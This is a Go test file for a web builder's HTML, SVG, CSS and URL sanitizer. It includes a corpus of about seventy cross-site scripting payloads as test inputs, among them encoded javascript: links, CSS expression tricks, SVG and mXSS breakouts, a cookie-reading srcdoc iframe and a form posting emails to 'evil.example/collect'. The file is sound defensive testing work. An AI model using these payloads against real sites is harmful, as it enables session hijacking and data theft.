package webbuilder

import (
	"encoding/json"
	"os"
	"path/filepath"
	"sort"
	"strings"
	"testing"

	"golang.org/x/net/html"
)

const testFormPrefix = "https://example.com/wp-json/web-builder/v2/forms/42/"

func wrapRoot(inner string) string {
	return `<div class="wb-page cv" data-wb-root style="--brand:#2271b1">` + inner + `</div>`
}

func sanitizeOK(t testing.TB, inner string, opts SnapshotOptions) (string, bool) {
	t.Helper()
	out, changed, err := SanitizeSnapshot(wrapRoot(inner), opts)
	if err != nil {
		t.Fatalf("SanitizeSnapshot(%q): %v", inner, err)
	}
	return out, changed
}

// assertSafe parses sanitized output the way a browser would and checks the invariants the
// sanitizer promises: no forbidden or unknown elements, no event handlers, no foreign attributes,
// only allowed URL schemes, sandboxed srcdoc iframes or allowlisted video iframes, clean styles.
func assertSafe(t testing.TB, out string, opts SnapshotOptions) {
	t.Helper()
	nodes, err := parseFragment(out)
	if err != nil {
		t.Fatalf("reparse: %v", err)
	}
	var walk func(n *html.Node, path string)
	walk = func(n *html.Node, path string) {
		if n.Type == html.ElementNode {
			name := n.Data
			p := path + "/" + name
			if forbiddenSet[strings.ToLower(name)] {
				t.Fatalf("forbidden element %s in %q", p, out)
			}
			switch n.Namespace {
			case "":
				if !elementSet[name] {
					t.Fatalf("unknown element %s in %q", p, out)
				}
			case "svg":
				if !svgElementSet[name] {
					t.Fatalf("unknown svg element %s in %q", p, out)
				}
			default:
				t.Fatalf("foreign namespace %s:%s in %q", n.Namespace, p, out)
			}
			for _, a := range n.Attr {
				k := strings.ToLower(a.Key)
				lv := strings.ToLower(stripURLControl(a.Val))
				if strings.HasPrefix(k, "on") {
					t.Fatalf("event handler %s on %s in %q", a.Key, p, out)
				}
				if a.Namespace != "" && !(a.Namespace == "xlink" && a.Key == "href") {
					t.Fatalf("namespaced attr %s:%s in %q", a.Namespace, a.Key, out)
				}
				if strings.HasPrefix(k, "data-") && !strings.HasPrefix(k, "data-wb-") {
					t.Fatalf("data attr %s in %q", k, out)
				}
				switch k {
				case "href", "src", "poster", "action", "srcset", "xlink:href":
					for _, u := range strings.Split(lv, ",") {
						u = strings.TrimSpace(u)
						if m := schemeRE.FindStringSubmatch(u); m != nil {
							switch m[1] {
							case "http", "https", "mailto", "tel":
							case "data":
								if !strings.HasPrefix(u, "data:image/") {
									t.Fatalf("bad data URL %s=%q in %q", k, a.Val, out)
								}
							default:
								t.Fatalf("bad URL scheme %s=%q in %q", k, a.Val, out)
							}
						}
						if k != "srcset" {
							break
						}
					}
				case "style":
					if again, changed := SanitizeStyleAttr(a.Val); changed || again != a.Val {
						t.Fatalf("style not clean %q → %q", a.Val, again)
					}
					if n := cssNormalize(a.Val); strings.Contains(n, "expression(") || strings.Contains(n, "javascript:") || strings.Contains(n, "-moz-binding") || strings.Contains(n, "behavior") {
						t.Fatalf("style %q", a.Val)
					}
				case "srcdoc":
					if !opts.EmbedHTML {
						t.Fatalf("srcdoc without EmbedHTML in %q", out)
					}
				}
				if n.Namespace == "svg" && (k == "href") && !strings.HasPrefix(strings.TrimSpace(a.Val), "#") {
					t.Fatalf("svg href %q", a.Val)
				}
			}
			if name == "iframe" && n.Namespace == "" {
				src, hasSrc := getAttr(n, "src")
				_, hasDoc := getAttr(n, "srcdoc")
				sb, hasSB := getAttr(n, "sandbox")
				switch {
				case hasDoc:
					if !hasSB || sb != EmbedSandbox || hasSrc {
						t.Fatalf("srcdoc iframe without the sandbox in %q", out)
					}
				case hasSrc:
					if !videoEmbedOK(src) {
						t.Fatalf("foreign iframe %q", src)
					}
				default:
					t.Fatalf("empty iframe kept in %q", out)
				}
			}
			if name == "a" && n.Namespace == "" {
				if tg, ok := getAttr(n, "target"); ok {
					rel, _ := getAttr(n, "rel")
					if tg != "_blank" || !strings.Contains(rel, "noopener") || !strings.Contains(rel, "noreferrer") {
						t.Fatalf("target without rel in %q", out)
					}
				}
			}
			if name == "form" && n.Namespace == "" {
				if act, ok := getAttr(n, "action"); ok && !strings.HasPrefix(act, opts.FormActionPrefix) {
					t.Fatalf("foreign form action %q", act)
				}
			}
			if name == "input" && n.Namespace == "" {
				if ty, ok := getAttr(n, "type"); ok && !inputTypeSet[ty] {
					t.Fatalf("input type %q", ty)
				}
			}
			path = p
		}
		if n.Type == html.CommentNode {
			t.Fatalf("comment kept in %q", out)
		}
		for c := n.FirstChild; c != nil; c = c.NextSibling {
			walk(c, path)
		}
	}
	for _, n := range nodes {
		walk(n, "")
	}
}

// The XSS corpus of the S2 done criteria.
var xssCorpus = []string{
	`<img src=x onerror=alert(1)>`,
	`<IMG SRC="javascript:alert('XSS');">`,
	`<a href="javascript:alert(1)">x</a>`,
	`<a href="JaVaScRiPt:alert(1)">x</a>`,
	`<a href="java&#x09;script:alert(1)">x</a>`,
	`<a href="&#106;avascript:alert(1)">x</a>`,
	`<a href=" javascript:alert(1)">x</a>`,
	`<a href="vbscript:msgbox(1)">x</a>`,
	`<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">x</a>`,
	`<a href="//evil.example/">x</a>`,
	`<a href="/\evil.example/">x</a>`,
	`<img src="data:text/html,<script>alert(1)</script>">`,
	`<img src="data:image/svg+xml;base64,PHN2Zz4=" onload="alert(1)">`,
	`<video poster="javascript:alert(1)" src="javascript:alert(1)"></video>`,
	`<img srcset="javascript:alert(1) 1x, /ok.png 2x">`,
	`<script>alert(1)</script>`,
	`<scr<script>ipt>alert(1)</script>`,
	`<p>text</script><script>alert(1)</script></p>`,
	`<p>&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;</p>`,
	`<style>body{background:url(javascript:alert(1))}</style>`,
	`<p>a</style><script>alert(1)</script></p>`,
	`<div style="background:url(javascript:alert(1))">x</div>`,
	`<div style="width:expression(alert(1))">x</div>`,
	`<div style="width:exp/**/ression(alert(1))">x</div>`,
	`<div style="behavior:url(x.htc)">x</div>`,
	`<div style="-moz-binding:url(http://x/x.xml#x)">x</div>`,
	`<div style="background:url(&quot;javascript:alert(1)&quot;)">x</div>`,
	`<div style="background-image:url(data:text/html,x)">x</div>`,
	`<div style="color:red;background:u\72l(javascript:alert(1))">x</div>`,
	`<div style="background:\75 rl(java\73 cript:alert(1))">x</div>`,
	`<svg><script>alert(1)</script></svg>`,
	`<svg onload=alert(1)><circle r="5"/></svg>`,
	`<svg><foreignObject><img src=x onerror=alert(1)></foreignObject></svg>`,
	`<svg><a xlink:href="javascript:alert(1)"><text>x</text></a></svg>`,
	`<svg><use href="https://evil.example/x.svg#a"/></svg>`,
	`<svg><use xlink:href="data:image/svg+xml,<svg id='a'/>#a"/></svg>`,
	`<svg><animate attributeName="href" to="javascript:alert(1)"/></svg>`,
	`<svg><set attributeName="onmouseover" to="alert(1)"/></svg>`,
	`<svg><rect fill="url(javascript:alert(1))" width="1" height="1"/></svg>`,
	`<svg><style>@import url(//evil)</style></svg>`,
	`<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>`,
	`<meta http-equiv="refresh" content="0;url=javascript:alert(1)">`,
	`<base href="https://evil.example/">`,
	`<link rel="stylesheet" href="https://evil.example/x.css">`,
	`<iframe src="https://evil.example/"></iframe>`,
	`<iframe src="javascript:alert(1)"></iframe>`,
	`<iframe src="http://www.youtube.com/embed/x"></iframe>`,
	`<iframe src="https://www.youtube.com.evil.example/embed/x"></iframe>`,
	`<iframe srcdoc="<script>alert(document.cookie)</script>"></iframe>`,
	`<iframe sandbox="allow-scripts allow-same-origin" srcdoc="<script>parent.x</script>"></iframe>`,
	`<object data="javascript:alert(1)"></object>`,
	`<embed src="javascript:alert(1)">`,
	`<form action="https://evil.example/collect"><input name="email"></form>`,
	`<form action="javascript:alert(1)"><button formaction="javascript:alert(1)">x</button></form>`,
	`<input type="image" src="x" onerror="alert(1)">`,
	`<input onfocus=alert(1) autofocus>`,
	`<details open ontoggle=alert(1)>x</details>`,
	`<a href="#" target="_top">x</a>`,
	`<a href="https://x.example/" target="_blank">x</a>`,
	`<div data-foo="x" data-wb-menu="" data-wb-x="1">x</div>`,
	`<noscript><p title="</noscript><img src=x onerror=alert(1)>"></noscript>`,
	`<template><script>alert(1)</script></template>`,
	`<!--<img src=x onerror=alert(1)>-->`,
	`<portal src="https://evil.example/"></portal>`,
	`<frameset><frame src="javascript:alert(1)"></frameset>`,
	`<textarea></textarea><script>alert(1)</script>`,
	`<select><option><script>alert(1)</script></option></select>`,
	`<button type="submit" formaction="https://evil.example">x</button>`,
	`<div id="x" class="y" title="</div><script>alert(1)</script>">x</div>`,
}

// corpusUnchanged are entries that are already inert as parsed (escaped text, attribute values,
// markup the HTML parser itself drops) or already correct.
var corpusUnchanged = map[string]bool{
	`<a href="https://x.example/" target="_blank">x</a>`:                    false, // rel is added
	`<p>&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;</p>`:           true,
	`<frameset><frame src="javascript:alert(1)"></frameset>`:                true,
	`<div id="x" class="y" title="</div><script>alert(1)</script>">x</div>`: true,
}

func TestSnapshotXSSCorpus(t *testing.T) {
	for _, embed := range []bool{false, true} {
		opts := SnapshotOptions{FormActionPrefix: testFormPrefix, EmbedHTML: embed}
		for _, in := range xssCorpus {
			out, changed := sanitizeOK(t, in, opts)
			assertSafe(t, out, opts)
			low := strings.ToLower(out)
			for _, bad := range []string{"<script", "javascript:", "vbscript:", "data:text/html", "onerror", "onload", "<style", "<meta", "<base", "<link", "foreignobject", "<object", "<embed", "evil.example/collect", "allow-same-origin", "<!--", "<math"} {
				if strings.Contains(low, bad) && !(embed && strings.Contains(low, "srcdoc=")) {
					t.Errorf("embed=%v %q → %q still contains %q", embed, in, out, bad)
				}
			}
			if !changed && !corpusUnchanged[in] {
				// Every corpus entry carries something to remove.
				t.Errorf("embed=%v %q reported unchanged → %q", embed, in, out)
			}
		}
	}
}

func TestSnapshotIframes(t *testing.T) {
	yt := `<iframe src="https://www.youtube-nocookie.com/embed/abc" title="Video" allow="autoplay; encrypted-media; camera" allowfullscreen loading="lazy"></iframe>`
	out, _ := sanitizeOK(t, yt, SnapshotOptions{})
	if !strings.Contains(out, `src="https://www.youtube-nocookie.com/embed/abc"`) || strings.Contains(out, "camera") {
		t.Fatalf("video iframe: %q", out)
	}
	doc := `<iframe data-wb-embed="e1" srcdoc="&lt;b&gt;hi&lt;/b&gt;" sandbox="allow-scripts"></iframe>`
	out, _ = sanitizeOK(t, doc, SnapshotOptions{})
	if strings.Contains(out, "iframe") {
		t.Fatalf("srcdoc kept without EmbedHTML: %q", out)
	}
	out, _ = sanitizeOK(t, doc, SnapshotOptions{EmbedHTML: true})
	if !strings.Contains(out, `sandbox="allow-scripts"`) || !strings.Contains(out, "srcdoc=") {
		t.Fatalf("srcdoc dropped with EmbedHTML: %q", out)
	}
	out, _ = sanitizeOK(t, `<iframe srcdoc="x" sandbox="allow-scripts allow-same-origin"></iframe>`, SnapshotOptions{EmbedHTML: true})
	if strings.Contains(out, "same-origin") || !strings.Contains(out, `sandbox="allow-scripts"`) {
		t.Fatalf("sandbox not forced: %q", out)
	}
}

func TestSnapshotForms(t *testing.T) {
	in := `<form data-wb-form method="get" action="` + testFormPrefix + `s9" novalidate><input type="text" name="name"><input type="email" name="email" required><input name="wb_hp" tabindex="-1" autocomplete="off"><input type="hidden" name="wb_t"><input name="password"><textarea name="message"></textarea><button type="submit">Send</button><p data-wb-form-status aria-live="polite"></p></form>`
	out, _ := sanitizeOK(t, in, SnapshotOptions{FormActionPrefix: testFormPrefix})
	for _, want := range []string{`method="post"`, `action="` + testFormPrefix + `s9"`, `name="wb_hp"`, `name="email"`, `aria-live="polite"`} {
		if !strings.Contains(out, want) {
			t.Errorf("missing %s in %q", want, out)
		}
	}
	if strings.Contains(out, "password") {
		t.Errorf("unknown input name kept: %q", out)
	}
	out, _ = sanitizeOK(t, `<form action="`+testFormPrefix+`../../x"></form>`, SnapshotOptions{FormActionPrefix: testFormPrefix})
	if strings.Contains(out, "action=") {
		t.Errorf("traversal action kept: %q", out)
	}
}

func TestSnapshotRoot(t *testing.T) {
	bad := []string{
		``,
		`<p>x</p>`,
		`<div class="wb-page">no root attr</div>`,
		`<div data-wb-root>no class</div>`,
		wrapRoot("") + wrapRoot(""),
		wrapRoot("") + "text",
		`<section class="wb-page" data-wb-root></section>`,
		`<svg class="wb-page" data-wb-root></svg>`,
	}
	for _, in := range bad {
		if _, _, err := SanitizeSnapshot(in, SnapshotOptions{}); err != ErrSnapshotRoot {
			t.Errorf("%q: err=%v, want ErrSnapshotRoot", in, err)
		}
	}
	if _, _, err := SanitizeSnapshot("  <!-- c -->\n"+wrapRoot("<p>x</p>")+"\n", SnapshotOptions{}); err != nil {
		t.Errorf("whitespace around root: %v", err)
	}
	if _, _, err := SanitizeSnapshot(strings.Repeat("a", MaxSnapshotHTML+1), SnapshotOptions{}); err != ErrSnapshotTooLarge {
		t.Errorf("too large: %v", err)
	}
}

// A realistic snapshot survives sanitizing as an equivalent DOM.
const goodSnapshot = `<div class="wb-page cv" data-wb-root="" style="--brand:#2271b1;--f-head:'Space Grotesk', sans-serif">` +
	`<nav class="flex items-center gap-4 @max-3xl:hidden" data-wb-sticky=""><a href="#s2" class="font-semibold">Home</a><a href="https://example.com/docs" target="_blank" rel="noopener noreferrer">Docs</a><a href="mailto:hi@example.com">Mail</a><a href="tel:+905550000000">Call</a>` +
	`<details data-wb-menu=""><summary aria-label="Menu" aria-expanded="false"><svg viewBox="0 0 24 24" width="24" height="24" fill="none" stroke="currentColor" stroke-width="2" aria-hidden="true"><path d="M4 6h16M4 12h16M4 18h16"></path></svg></summary><div><a href="/about">About</a></div></details></nav>` +
	`<section id="s2" class="relative overflow-hidden" data-wb-motion="fade-up" data-wb-dur="600" data-wb-delay="0" style="padding-top:96px;background:linear-gradient(135deg, #4058e3, #131417)">` +
	`<h1 class="text-balance">Build <b>faster</b></h1><p>Line one<br>Line two</p>` +
	`<img src="/wp-content/uploads/2026/11/hero.jpg" srcset="/wp-content/uploads/2026/11/hero-800.jpg 800w, /wp-content/uploads/2026/11/hero.jpg 1600w" sizes="(min-width: 1024px) 50vw, 100vw" alt="Hero" width="1600" height="900" loading="lazy" decoding="async">` +
	`<img src="data:image/png;base64,iVBORw0KGgo=" alt="">` +
	`<svg viewBox="0 0 100 100" aria-hidden="true"><defs><linearGradient id="g1" x1="0" y1="0" x2="1" y2="1"><stop offset="0" stop-color="#fff"></stop><stop offset="1" stop-color="#000" stop-opacity="0.5"></stop></linearGradient><clipPath id="c1"><circle cx="50" cy="50" r="40"></circle></clipPath></defs><rect width="100" height="100" fill="url(#g1)" clip-path="url(#c1)"></rect><use href="#g1"></use></svg>` +
	`<div role="tablist" data-wb-tabs="" data-wb-autoplay="5000"><button role="tab" type="button" data-wb-tab="t1" aria-controls="p1" aria-selected="true">One</button><div role="tabpanel" id="p1" data-wb-panel="t1">Panel</div></div>` +
	`<iframe src="https://player.vimeo.com/video/123" title="Video" allow="autoplay; fullscreen; picture-in-picture" allowfullscreen="" loading="lazy" referrerpolicy="strict-origin-when-cross-origin"></iframe>` +
	`<blockquote><p>Quote</p><cite>Someone</cite></blockquote>` +
	`<ul><li>a</li><li><code>b</code></li></ul>` +
	`</section></div>`

func TestSnapshotGoodSurvives(t *testing.T) {
	opts := SnapshotOptions{FormActionPrefix: testFormPrefix}
	out, changed, err := SanitizeSnapshot(goodSnapshot, opts)
	if err != nil {
		t.Fatal(err)
	}
	if changed {
		t.Errorf("good snapshot reported changed")
	}
	if a, b := domString(t, goodSnapshot), domString(t, out); a != b {
		t.Fatalf("DOM differs\nin:  %s\nout: %s", a, b)
	}
	assertSafe(t, out, opts)
}

// domString is a canonical dump of the DOM (sorted attributes, adjusted SVG names) for
// equivalence checks.
func domString(t testing.TB, s string) string {
	t.Helper()
	nodes, err := parseFragment(s)
	if err != nil {
		t.Fatal(err)
	}
	var b strings.Builder
	var walk func(n *html.Node)
	walk = func(n *html.Node) {
		switch n.Type {
		case html.TextNode:
			b.WriteString("#" + n.Data)
		case html.ElementNode:
			b.WriteString("<" + n.Namespace + ":" + n.Data)
			attrs := make([]string, 0, len(n.Attr))
			for _, a := range n.Attr {
				attrs = append(attrs, a.Namespace+":"+a.Key+"="+a.Val)
			}
			sort.Strings(attrs)
			b.WriteString(" " + strings.Join(attrs, " ") + ">")
			for c := n.FirstChild; c != nil; c = c.NextSibling {
				walk(c)
			}
			b.WriteString("</>")
		}
	}
	for _, n := range nodes {
		walk(n)
	}
	return b.String()
}

func TestSanitizeSVG(t *testing.T) {
	in := `<svg viewBox="0 0 10 10" onload="alert(1)"><script>alert(1)</script><g><path d="M0 0h10" fill="red"/></g><foreignObject><p>x</p></foreignObject></svg>`
	out := SanitizeSVG(in)
	if strings.Contains(out, "script") || strings.Contains(out, "onload") || strings.Contains(strings.ToLower(out), "foreignobject") || !strings.Contains(out, "<path") {
		t.Fatalf("SanitizeSVG: %q", out)
	}
	if SanitizeSVG(`<svg><p>breakout</p></svg>`) != "" || SanitizeSVG(`<div>x</div>`) != "" || SanitizeSVG(`<svg></svg><svg></svg>`) != "" {
		t.Fatal("non-svg kept")
	}
}

func TestSafeHrefAndImages(t *testing.T) {
	for in, want := range map[string]bool{
		"https://x.example/": true, "http://x": true, "mailto:a@b.c": true, "tel:+90": true,
		"#s1": true, "/about": true, "about": true, "?q=1": true,
		"javascript:alert(1)": false, " javascript:x": false, "java\tscript:x": false,
		"\x01javascript:x": false, "data:text/html,x": false, "//evil": false, `\\evil`: false,
		`/\evil`: false, "vbscript:x": false, "file:///etc/passwd": false, "": false,
	} {
		if _, got := SafeHref(in); got != want {
			t.Errorf("SafeHref(%q)=%v want %v", in, got, want)
		}
	}
	big := "data:image/png;base64," + strings.Repeat("A", MaxDataURIBytes)
	for in, want := range map[string]bool{
		"https://x/a.png": true, "/a.png": true, "data:image/png;base64,AAA": true,
		"data:image/svg+xml,%3Csvg%3E": true, "data:text/html,x": false, "data:image/x-evil,x": false,
		big: false, "javascript:x": false, "//cdn/x.png": false,
	} {
		if got := ImageURLOK(in, true); got != want {
			t.Errorf("ImageURLOK(%q)=%v want %v", trunc(in, 40), got, want)
		}
	}
	if ImageURLOK("data:image/png;base64,AAA", false) {
		t.Error("data URI allowed without allowData")
	}
}

func TestRichText(t *testing.T) {
	cases := map[string]string{
		`<b>bold</b> <strong>x</strong>`:                         `<b>bold</b> <b>x</b>`,
		`<a href="javascript:alert(1)">x</a>`:                    `x`,
		`<a href="https://x.example/" onclick="y">x</a>`:         `<a href="https://x.example/" target="_blank" rel="noopener noreferrer">x</a>`,
		`<a href="#s1">in</a>`:                                   `<a href="#s1">in</a>`,
		`<i>a</i><img src=x onerror=alert(1)><script>x</script>`: `<i>a</i>`,
		`<ul><li>a</li><li>b<br></li></ul>`:                      `<ul><li>a</li><li>b</li></ul>`,
		`<p>one</p><p>two</p>`:                                   `one<br>two`,
		`<span style="x">plain</span> <em>e</em>`:                `plain <i>e</i>`,
		`<b></b>x<br><br><br><br>y`:                              `x<br><br>y`,
		`<a href="/a"><a href="/b">nested</a></a>`:               `<a href="/a"></a><a href="/b">nested</a>`,
	}
	for in, want := range cases {
		got := SanitizeRich(in)
		if got != want && !(in == `<a href="/a"><a href="/b">nested</a></a>` && got == `<a href="/b">nested</a>`) {
			t.Errorf("SanitizeRich(%q)=%q want %q", in, got, want)
		}
	}
	if IsRich("Tom & Jerry <3") || !IsRich("a <b>b</b>") {
		t.Error("IsRich")
	}
	if got := ToPlain("<b>Hi</b> &amp; <ul><li>a</li></ul>"); got != "Hi &amp; \n• a"[0:0]+"Hi & \n• a" {
		t.Errorf("ToPlain=%q", got)
	}
	if got := RichHTML("<script>x</script>\nline"); got != "&lt;script&gt;x&lt;/script&gt;<br>line" {
		t.Errorf("RichHTML plain=%q", got)
	}
}

// Upstream renderStatic fixtures (exported by package U2 as testdata/render/<name>.render.json,
// a RenderResult, with the source doc in <name>.doc.json) must sanitize to an equivalent DOM, keep
// their CSS and validate.
func TestRenderFixtures(t *testing.T) {
	files, _ := filepath.Glob(filepath.Join("testdata", "render", "*.render.json"))
	if len(files) == 0 {
		t.Skip("no renderStatic fixtures in testdata/render yet (exported by U2)")
	}
	opts := SnapshotOptions{FormActionPrefix: testFormPrefix}
	for _, f := range files {
		b, err := os.ReadFile(f)
		if err != nil {
			t.Fatal(err)
		}
		var rr RenderResult
		if err := json.Unmarshal(b, &rr); err != nil {
			t.Fatalf("%s: %v", f, err)
		}
		out, _, err := SanitizeSnapshot(rr.HTML, opts)
		if err != nil {
			t.Errorf("%s: %v", f, err)
			continue
		}
		if a, b := domString(t, rr.HTML), domString(t, out); a != b {
			t.Errorf("%s: DOM differs after sanitizing\nin:  %s\nout: %s", f, a, b)
		}
		if rr.CSS != "" {
			if css, changed, err := SanitizeCSS(rr.CSS, CSSOptions{}); err != nil || changed {
				t.Errorf("%s: css changed=%v err=%v\n%s", f, changed, err, css)
			}
		}
		docFile := strings.TrimSuffix(f, ".render.json") + ".doc.json"
		if raw, err := os.ReadFile(docFile); err == nil {
			r, err := ParseDoc(raw, DocOptions{UnfilteredHTML: true})
			if err != nil || !r.Valid() {
				t.Errorf("%s: %v %+v", docFile, err, r)
			}
		}
	}
}
